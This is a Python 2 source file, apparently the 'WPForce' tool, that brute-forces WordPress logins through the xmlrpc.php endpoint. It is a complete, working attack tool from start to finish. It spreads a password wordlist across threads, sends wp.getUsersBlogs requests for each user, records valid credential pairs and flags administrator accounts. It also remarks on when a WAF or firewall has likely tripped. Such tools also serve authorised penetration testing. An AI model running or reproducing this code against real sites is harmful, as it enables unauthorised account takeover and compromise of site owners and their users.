import re
import sys
import time
import socket
import urllib2
import argparse
import threading
from urlparse import urljoin

__author__ = 'n00py'
# These variables must be shared by all threads dynamically
correct_pairs = {}
total = 0

def has_colours(stream):
    if not hasattr(stream, "isatty"):
        return False
    if not stream.isatty():
        return False # auto color only on TTYs
    try:
        import curses
        curses.setupterm()
        return curses.tigetnum("colors") > 2
    except:
        return False
has_colours = has_colours(sys.stdout)
BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)


def printout(text, colour=WHITE):
        if has_colours:
                seq = "\x1b[1;%dm" % (30+colour) + text + "\x1b[0m"
                sys.stdout.write(seq)
        else:
                sys.stdout.write(text)


def slice_list(input, size):
    input_size = len(input)
    slice_size = input_size / size
    remain = input_size % size
    result = []
    iterator = iter(input)
    for i in range(size):
        result.append([])
        for j in range(slice_size):
            result[i].append(iterator.next())
        if remain:
            result[i].append(iterator.next())
            remain -= 1
    return result


def worker(wordlist,thread_no,url,userlist,verbose,debug,agent):
    global total
    global correct_pairs
    for n in wordlist:
        current_pass = wordlist.index(n)
        for x in userlist:
            current_user = userlist.index(x)
            user = userlist[current_user]
            password = wordlist[current_pass]
            if user not in correct_pairs:
                if user != "":
                    if password != "":
                        PasswordAttempt(user,password,url,thread_no,verbose,debug,agent)
        total += 1


def BuildThreads(list_array,url,debug,userlist,verbose,agent):
    if debug:
        print "Here is the content of the wordlists for each thread"
        for i in range(len(list_array)):
            print "Thread " + str(i)
            printout(str(list_array[i]), YELLOW)
            print "\n-----------------------------------------------------"
    threads = []
    for i in range(len(list_array)):
        t = threading.Thread(target=worker, args=(list_array[i], i, url,userlist,verbose,debug,agent))
        t.daemon = True
        threads.append(t)
        t.start()


def PrintBanner(input,wordlist,url,userlist,passlist):
    banner = """\
       ,-~~-.___.       __        __ ____   _____
      / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
         ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
        /  \-'~;   ||     |                v.1.0.0
       /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress
     =(  _____||________|                 ~n00py~
    """
    print banner
    print ("Username List: %s" % input) + " (" + str(len(userlist)) + ")"
    print ("Password List: %s" % wordlist) + " (" + str(len(passlist)) + ")"
    print ("URL: %s" % url)


def TestSite(url):
    protocheck(url)
    print "Trying: " + url
    try:
        urllib2.urlopen(url, timeout=3)
    except urllib2.HTTPError, e:
        if e.code == 405:
            print url + " found!"
            print "Now the brute force will begin!  >:)"
        if e.code == 404:
            printout(str(e), YELLOW)
            print " - XMLRPC has been moved, removed, or blocked"
            sys.exit()
    except urllib2.URLError, g:
        printout("Could not identify XMLRPC.  Please verify the domain.\n", YELLOW)
        sys.exit()
    except socket.timeout as e:
        print type(e)
        printout("The socket timed out, try it again.", YELLOW)
        sys.exit()


def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent):
    global passlist
    if verbose is True or debug is True:
        if debug is True:
            thready = "[Thread " + str(thread_no) + "]"
            printout(thready, YELLOW)
        print "Trying " + user + " : " + password + "\n",
    headers = {'User-Agent': agent,
               'Connection': 'keep-alive',
               'Accept': 'text/html'
               }
    post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
    try:
        req = urllib2.Request(url, post, headers)
        response = urllib2.urlopen(req, timeout=3)
        the_page = response.read()
        look_for = "isAdmin"
        try:
            splitter = the_page.split(look_for, 1)[1]
            correct_pairs[user] = password
            print "--------------------------"
            success = "[" + user + " : " + password + "] are valid credentials!  "
            adminAlert = ""
            if splitter[23] == "1":
                adminAlert = "- THIS ACCOUNT IS ADMIN"
            printout(success, GREEN)
            printout(adminAlert, RED)
            print "\n--------------------------"
        except:
            pass
    except urllib2.URLError, e:
        if e.code == 404 or e.code == 403:
            global total
            printout(str(e), YELLOW)
            print " - WAF or security plugin likely in use"
            total = len(passlist)
            sys.exit()
        else:
            printout(str(e), YELLOW)
            print " - Try reducing Thread count "
            if args.verbose is True or args.debug is True:
                print user + ":" + password + " was skipped"
    except socket.timeout as e:
        printout(str(e), YELLOW)
        print " - Try reducing Thread count "
        if args.verbose is True or args.debug is True:
            print user + ":" + password + " was skipped"
    except socket.error as e:
        printout(str(e), YELLOW)
        print " - Got an RST, Probably tripped the firewall\n",
        total = len(passlist)
        sys.exit()


def protocheck(url):
    url_pattern = re.compile("http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+")
    if not url_pattern.match(url):
        printout("Incorrect URL. Please include the protocol in the URL.\n", YELLOW)
        sys.exit()

def main():
    parser = argparse.ArgumentParser(description='This is a tool to brute force Worpress using the Wordpress API')
    users = parser.add_mutually_exclusive_group(required=True)
    users.add_argument('-i','--input', help='Input file name')
    users.add_argument('-si' '--singleinput', help='Input list of users', action='store', dest='singleinput', nargs='+')
    parser.add_argument('-w','--wordlist',help='Wordlist file name', required=True)
    parser.add_argument('-u','--url',help='URL of target', required=True)
    parser.add_argument('-v','--verbose',help=' Verbose output.  Show the attemps as they happen.', required=False, action='store_true')
    parser.add_argument('-t','--threads',help=' Determines the number of threads to be used, default is 10', type=int, default=10, required=False)
    parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
    parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
    args = parser.parse_args()
    
    url = args.url
    url = urljoin(url, 'xmlrpc.php')

    if args.input:
        userlist = open(args.input, 'r').read().split('\n')
    else:
        printout("Remember to pass usernames in space delimited form!\n", YELLOW)
        userlist = args.singleinput

    totalusers = len(userlist)

    passlist = open(args.wordlist, 'r').read().split('\n')
    
    PrintBanner(args.input,args.wordlist,args.url,userlist,passlist)
    TestSite(url)

    list_array = slice_list(passlist, args.threads)
    BuildThreads(list_array,url,args.debug,userlist,args.verbose,args.agent)
    while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
            time.sleep(0.1)
            sys.stdout.flush()
            percent = "%.0f%%" % (100 * (total)/len(passlist))
            print " " + percent + " Percent Complete\r",
    
    print "\nAll correct pairs:"
    printout(str(correct_pairs), GREEN)
    print ""

if __name__ == "__main__":
    main()
